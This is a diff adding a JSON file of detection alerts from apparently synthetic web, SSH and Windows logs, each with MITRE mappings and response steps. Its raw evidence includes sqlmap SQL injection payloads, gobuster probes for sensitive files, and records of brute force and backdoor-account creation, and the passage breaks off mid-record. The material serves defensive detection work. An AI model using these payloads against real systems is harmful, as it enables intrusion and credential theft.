@@ -1,0 +1,1035 @@
+[
+  {
+    "rule_id": "web_scanning_404_burst",
+    "title": "Web directory scanning (burst of 404s)",
+    "severity": "medium",
+    "mitre": {
+      "tactic": "Reconnaissance",
+      "technique_id": "T1595.003",
+      "technique": "Active Scanning: Wordlist Scanning"
+    },
+    "first_seen": "2026-10-14T09:02:03+00:00",
+    "last_seen": "2026-10-14T09:02:40+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {
+      "src_ip": "203.0.113.45"
+    },
+    "summary": "32 matching events (src_ip=203.0.113.45) between 09:02:03 and 09:02:40",
+    "event_count": 32,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:02:03+00:00",
+        "file": "web01_access.log",
+        "line": 84,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:03 +0000] \"GET /admin HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:03+00:00",
+        "file": "web01_access.log",
+        "line": 85,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:03 +0000] \"GET /administrator HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:05+00:00",
+        "file": "web01_access.log",
+        "line": 86,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:05 +0000] \"GET /wp-admin HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:06+00:00",
+        "file": "web01_access.log",
+        "line": 87,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:06 +0000] \"GET /wp-login.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:07+00:00",
+        "file": "web01_access.log",
+        "line": 88,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:07 +0000] \"GET /phpmyadmin HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:08+00:00",
+        "file": "web01_access.log",
+        "line": 89,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:08 +0000] \"GET /.env HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:09+00:00",
+        "file": "web01_access.log",
+        "line": 90,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:09 +0000] \"GET /.git/config HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:10+00:00",
+        "file": "web01_access.log",
+        "line": 91,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:10 +0000] \"GET /backup.zip HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:12+00:00",
+        "file": "web01_access.log",
+        "line": 92,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:12 +0000] \"GET /backup.sql HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:13+00:00",
+        "file": "web01_access.log",
+        "line": 93,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:13 +0000] \"GET /db.sql HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:14+00:00",
+        "file": "web01_access.log",
+        "line": 94,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:14 +0000] \"GET /config.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:16+00:00",
+        "file": "web01_access.log",
+        "line": 95,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:16 +0000] \"GET /config.bak HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:17+00:00",
+        "file": "web01_access.log",
+        "line": 97,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:17 +0000] \"GET /server-status HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:18+00:00",
+        "file": "web01_access.log",
+        "line": 98,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:18 +0000] \"GET /test HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:19+00:00",
+        "file": "web01_access.log",
+        "line": 99,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:19 +0000] \"GET /dev HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:21+00:00",
+        "file": "web01_access.log",
+        "line": 100,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:21 +0000] \"GET /old HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:22+00:00",
+        "file": "web01_access.log",
+        "line": 101,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:22 +0000] \"GET /api/v1/users HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:23+00:00",
+        "file": "web01_access.log",
+        "line": 102,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:23 +0000] \"GET /api/debug HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:24+00:00",
+        "file": "web01_access.log",
+        "line": 103,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:24 +0000] \"GET /console HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:25+00:00",
+        "file": "web01_access.log",
+        "line": 104,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:25 +0000] \"GET /manager/html HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:27+00:00",
+        "file": "web01_access.log",
+        "line": 105,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:27 +0000] \"GET /admin.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:28+00:00",
+        "file": "web01_access.log",
+        "line": 106,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:28 +0000] \"GET /login.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:29+00:00",
+        "file": "web01_access.log",
+        "line": 107,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:29 +0000] \"GET /shell.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:30+00:00",
+        "file": "web01_access.log",
+        "line": 108,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:30 +0000] \"GET /cgi-bin/test.cgi HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:31+00:00",
+        "file": "web01_access.log",
+        "line": 109,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:31 +0000] \"GET /uploads/ HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:32+00:00",
+        "file": "web01_access.log",
+        "line": 110,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:32 +0000] \"GET /install.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:34+00:00",
+        "file": "web01_access.log",
+        "line": 112,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:34 +0000] \"GET /setup.php HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:35+00:00",
+        "file": "web01_access.log",
+        "line": 113,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:35 +0000] \"GET /web.config HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:36+00:00",
+        "file": "web01_access.log",
+        "line": 114,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:36 +0000] \"GET /.htaccess HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:37+00:00",
+        "file": "web01_access.log",
+        "line": 115,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:37 +0000] \"GET /.DS_Store HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:38+00:00",
+        "file": "web01_access.log",
+        "line": 116,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:38 +0000] \"GET /debug.log HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      },
+      {
+        "timestamp": "2026-10-14T09:02:40+00:00",
+        "file": "web01_access.log",
+        "line": 117,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:02:40 +0000] \"GET /error.log HTTP/1.1\" 404 162 \"-\" \"gobuster/3.6\""
+      }
+    ],
+    "response": [
+      "Check what else this IP did (SQL injection attempts, logins) in the same window.",
+      "Block the IP at the firewall or WAF if it is not a known scanner you authorized.",
+      "Review which paths returned 200 to the same IP; those are what the attacker found."
+    ]
+  },
+  {
+    "rule_id": "web_sqli_attempt",
+    "title": "SQL injection attempt in URL",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Initial Access",
+      "technique_id": "T1190",
+      "technique": "Exploit Public-Facing Application"
+    },
+    "first_seen": "2026-10-14T09:05:10+00:00",
+    "last_seen": "2026-10-14T09:05:10+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {},
+    "summary": "src_ip=203.0.113.45 /products?id=7' OR '1'='1",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:05:10+00:00",
+        "file": "web01_access.log",
+        "line": 125,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:05:10 +0000] \"GET /products?id=7%27%20OR%20%271%27%3D%271 HTTP/1.1\" 200 48112 \"-\" \"sqlmap/1.8.7#stable (https://sqlmap.org)\""
+      }
+    ],
+    "response": [
+      "Check the HTTP status and response size; a 200 with a large response may mean the injection worked.",
+      "Review the application's database logs for queries at the same time.",
+      "Block the source IP and confirm the vulnerable parameter uses parameterized queries."
+    ]
+  },
+  {
+    "rule_id": "web_sqli_attempt",
+    "title": "SQL injection attempt in URL",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Initial Access",
+      "technique_id": "T1190",
+      "technique": "Exploit Public-Facing Application"
+    },
+    "first_seen": "2026-10-14T09:05:27+00:00",
+    "last_seen": "2026-10-14T09:05:27+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {},
+    "summary": "src_ip=203.0.113.45 /products?id=7 UNION SELECT username,password FROM users--",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:05:27+00:00",
+        "file": "web01_access.log",
+        "line": 126,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:05:27 +0000] \"GET /products?id=7%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 500 512 \"-\" \"sqlmap/1.8.7#stable (https://sqlmap.org)\""
+      }
+    ],
+    "response": [
+      "Check the HTTP status and response size; a 200 with a large response may mean the injection worked.",
+      "Review the application's database logs for queries at the same time.",
+      "Block the source IP and confirm the vulnerable parameter uses parameterized queries."
+    ]
+  },
+  {
+    "rule_id": "web_sqli_attempt",
+    "title": "SQL injection attempt in URL",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Initial Access",
+      "technique_id": "T1190",
+      "technique": "Exploit Public-Facing Application"
+    },
+    "first_seen": "2026-10-14T09:05:44+00:00",
+    "last_seen": "2026-10-14T09:05:44+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {},
+    "summary": "src_ip=203.0.113.45 /products?id=7 AND SLEEP(5)",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:05:44+00:00",
+        "file": "web01_access.log",
+        "line": 128,
+        "raw": "203.0.113.45 - - [14/Oct/2026:09:05:44 +0000] \"GET /products?id=7%20AND%20SLEEP(5) HTTP/1.1\" 200 3402 \"-\" \"sqlmap/1.8.7#stable (https://sqlmap.org)\""
+      }
+    ],
+    "response": [
+      "Check the HTTP status and response size; a 200 with a large response may mean the injection worked.",
+      "Review the application's database logs for queries at the same time.",
+      "Block the source IP and confirm the vulnerable parameter uses parameterized queries."
+    ]
+  },
+  {
+    "rule_id": "linux_ssh_bruteforce",
+    "title": "SSH brute-force attack",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Credential Access",
+      "technique_id": "T1110.001",
+      "technique": "Brute Force: Password Guessing"
+    },
+    "first_seen": "2026-10-14T09:10:05+00:00",
+    "last_seen": "2026-10-14T09:11:19+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {
+      "src_ip": "203.0.113.45"
+    },
+    "summary": "14 matching events (src_ip=203.0.113.45) between 09:10:05 and 09:11:19",
+    "event_count": 14,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:10:05+00:00",
+        "file": "web01_auth.log",
+        "line": 14,
+        "raw": "Oct 14 09:10:05 web01 sshd[2001]: Failed password for root from 203.0.113.45 port 40000 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:12+00:00",
+        "file": "web01_auth.log",
+        "line": 16,
+        "raw": "Oct 14 09:10:12 web01 sshd[2002]: Failed password for invalid user admin from 203.0.113.45 port 40007 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:20+00:00",
+        "file": "web01_auth.log",
+        "line": 18,
+        "raw": "Oct 14 09:10:20 web01 sshd[2003]: Failed password for invalid user ubuntu from 203.0.113.45 port 40014 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:28+00:00",
+        "file": "web01_auth.log",
+        "line": 20,
+        "raw": "Oct 14 09:10:28 web01 sshd[2004]: Failed password for invalid user test from 203.0.113.45 port 40021 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:32+00:00",
+        "file": "web01_auth.log",
+        "line": 22,
+        "raw": "Oct 14 09:10:32 web01 sshd[2005]: Failed password for invalid user oracle from 203.0.113.45 port 40028 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:40+00:00",
+        "file": "web01_auth.log",
+        "line": 23,
+        "raw": "Oct 14 09:10:40 web01 sshd[2006]: Failed password for webadmin from 203.0.113.45 port 40035 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:45+00:00",
+        "file": "web01_auth.log",
+        "line": 24,
+        "raw": "Oct 14 09:10:45 web01 sshd[2007]: Failed password for root from 203.0.113.45 port 40042 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:50+00:00",
+        "file": "web01_auth.log",
+        "line": 26,
+        "raw": "Oct 14 09:10:50 web01 sshd[2008]: Failed password for invalid user admin from 203.0.113.45 port 40049 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:54+00:00",
+        "file": "web01_auth.log",
+        "line": 28,
+        "raw": "Oct 14 09:10:54 web01 sshd[2009]: Failed password for invalid user postgres from 203.0.113.45 port 40056 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:58+00:00",
+        "file": "web01_auth.log",
+        "line": 29,
+        "raw": "Oct 14 09:10:58 web01 sshd[2010]: Failed password for webadmin from 203.0.113.45 port 40063 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:02+00:00",
+        "file": "web01_auth.log",
+        "line": 31,
+        "raw": "Oct 14 09:11:02 web01 sshd[2011]: Failed password for invalid user user from 203.0.113.45 port 40070 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:06+00:00",
+        "file": "web01_auth.log",
+        "line": 32,
+        "raw": "Oct 14 09:11:06 web01 sshd[2012]: Failed password for root from 203.0.113.45 port 40077 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:14+00:00",
+        "file": "web01_auth.log",
+        "line": 33,
+        "raw": "Oct 14 09:11:14 web01 sshd[2013]: Failed password for webadmin from 203.0.113.45 port 40084 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:19+00:00",
+        "file": "web01_auth.log",
+        "line": 35,
+        "raw": "Oct 14 09:11:19 web01 sshd[2014]: Failed password for invalid user ftpuser from 203.0.113.45 port 40091 ssh2"
+      }
+    ],
+    "response": [
+      "Check whether the same IP later logged in successfully (see the follow-up rule).",
+      "Block the IP (fail2ban, firewall) and disable SSH password login in favor of keys.",
+      "Confirm the targeted accounts have strong passwords."
+    ]
+  },
+  {
+    "rule_id": "linux_ssh_login_after_bruteforce",
+    "title": "Successful SSH login after brute force",
+    "severity": "critical",
+    "mitre": {
+      "tactic": "Initial Access",
+      "technique_id": "T1078",
+      "technique": "Valid Accounts"
+    },
+    "first_seen": "2026-10-14T09:10:05+00:00",
+    "last_seen": "2026-10-14T09:11:52+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {
+      "src_ip": "203.0.113.45"
+    },
+    "summary": "14 matching events, then ssh_success as webadmin at 09:11:52 (src_ip=203.0.113.45)",
+    "event_count": 15,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:10:05+00:00",
+        "file": "web01_auth.log",
+        "line": 14,
+        "raw": "Oct 14 09:10:05 web01 sshd[2001]: Failed password for root from 203.0.113.45 port 40000 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:12+00:00",
+        "file": "web01_auth.log",
+        "line": 16,
+        "raw": "Oct 14 09:10:12 web01 sshd[2002]: Failed password for invalid user admin from 203.0.113.45 port 40007 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:20+00:00",
+        "file": "web01_auth.log",
+        "line": 18,
+        "raw": "Oct 14 09:10:20 web01 sshd[2003]: Failed password for invalid user ubuntu from 203.0.113.45 port 40014 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:28+00:00",
+        "file": "web01_auth.log",
+        "line": 20,
+        "raw": "Oct 14 09:10:28 web01 sshd[2004]: Failed password for invalid user test from 203.0.113.45 port 40021 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:32+00:00",
+        "file": "web01_auth.log",
+        "line": 22,
+        "raw": "Oct 14 09:10:32 web01 sshd[2005]: Failed password for invalid user oracle from 203.0.113.45 port 40028 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:40+00:00",
+        "file": "web01_auth.log",
+        "line": 23,
+        "raw": "Oct 14 09:10:40 web01 sshd[2006]: Failed password for webadmin from 203.0.113.45 port 40035 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:45+00:00",
+        "file": "web01_auth.log",
+        "line": 24,
+        "raw": "Oct 14 09:10:45 web01 sshd[2007]: Failed password for root from 203.0.113.45 port 40042 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:50+00:00",
+        "file": "web01_auth.log",
+        "line": 26,
+        "raw": "Oct 14 09:10:50 web01 sshd[2008]: Failed password for invalid user admin from 203.0.113.45 port 40049 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:54+00:00",
+        "file": "web01_auth.log",
+        "line": 28,
+        "raw": "Oct 14 09:10:54 web01 sshd[2009]: Failed password for invalid user postgres from 203.0.113.45 port 40056 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:10:58+00:00",
+        "file": "web01_auth.log",
+        "line": 29,
+        "raw": "Oct 14 09:10:58 web01 sshd[2010]: Failed password for webadmin from 203.0.113.45 port 40063 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:02+00:00",
+        "file": "web01_auth.log",
+        "line": 31,
+        "raw": "Oct 14 09:11:02 web01 sshd[2011]: Failed password for invalid user user from 203.0.113.45 port 40070 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:06+00:00",
+        "file": "web01_auth.log",
+        "line": 32,
+        "raw": "Oct 14 09:11:06 web01 sshd[2012]: Failed password for root from 203.0.113.45 port 40077 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:14+00:00",
+        "file": "web01_auth.log",
+        "line": 33,
+        "raw": "Oct 14 09:11:14 web01 sshd[2013]: Failed password for webadmin from 203.0.113.45 port 40084 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:19+00:00",
+        "file": "web01_auth.log",
+        "line": 35,
+        "raw": "Oct 14 09:11:19 web01 sshd[2014]: Failed password for invalid user ftpuser from 203.0.113.45 port 40091 ssh2"
+      },
+      {
+        "timestamp": "2026-10-14T09:11:52+00:00",
+        "file": "web01_auth.log",
+        "line": 36,
+        "raw": "Oct 14 09:11:52 web01 sshd[2101]: Accepted password for webadmin from 203.0.113.45 port 40214 ssh2"
+      }
+    ],
+    "response": [
+      "Treat the host as compromised. Isolate it from the network if possible.",
+      "Disable the account that logged in and reset its password.",
+      "Review everything that account did after login (sudo, new users, cron jobs, downloads)."
+    ]
+  },
+  {
+    "rule_id": "linux_user_created",
+    "title": "New Linux user account created",
+    "severity": "medium",
+    "mitre": {
+      "tactic": "Persistence",
+      "technique_id": "T1136.001",
+      "technique": "Create Account: Local Account"
+    },
+    "first_seen": "2026-10-14T09:13:05+00:00",
+    "last_seen": "2026-10-14T09:13:05+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {},
+    "summary": "user=sysupdate",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:13:05+00:00",
+        "file": "web01_auth.log",
+        "line": 38,
+        "raw": "Oct 14 09:13:05 web01 useradd[2151]: new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1"
+      }
+    ],
+    "response": [
+      "Confirm with the system owner that the account was expected.",
+      "If not, lock the account (usermod -L) and investigate who created it."
+    ]
+  },
+  {
+    "rule_id": "linux_user_added_to_sudo",
+    "title": "User added to Linux admin group",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Persistence",
+      "technique_id": "T1098",
+      "technique": "Account Manipulation"
+    },
+    "first_seen": "2026-10-14T09:13:21+00:00",
+    "last_seen": "2026-10-14T09:13:21+00:00",
+    "hosts": [
+      "web01"
+    ],
+    "group": {},
+    "summary": "user=sysupdate group=sudo",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T09:13:21+00:00",
+        "file": "web01_auth.log",
+        "line": 40,
+        "raw": "Oct 14 09:13:21 web01 usermod[2161]: add 'sysupdate' to group 'sudo'"
+      }
+    ],
+    "response": [
+      "Verify the change was approved.",
+      "If not, remove the user from the group and lock the account."
+    ]
+  },
+  {
+    "rule_id": "win_bruteforce",
+    "title": "Windows logon brute force",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Credential Access",
+      "technique_id": "T1110.001",
+      "technique": "Brute Force: Password Guessing"
+    },
+    "first_seen": "2026-10-14T10:20:02+00:00",
+    "last_seen": "2026-10-14T10:20:40+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {
+      "src_ip": "198.51.100.23"
+    },
+    "summary": "12 matching events (src_ip=198.51.100.23) between 10:20:02 and 10:20:40",
+    "event_count": 12,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:20:02+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 8,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:02Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49800\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:06+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 9,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:06Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49801\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:09+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 10,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:09Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49802\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:12+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 11,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:12Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49803\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:15+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 12,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:15Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49804\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:19+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 13,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:19Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49805\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:22+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 14,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:22Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49806\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:25+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 15,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:25Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49807\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:28+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 16,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:28Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49808\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:31+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 17,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:31Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49809\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:36+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 18,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:36Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49810\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:40+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 19,
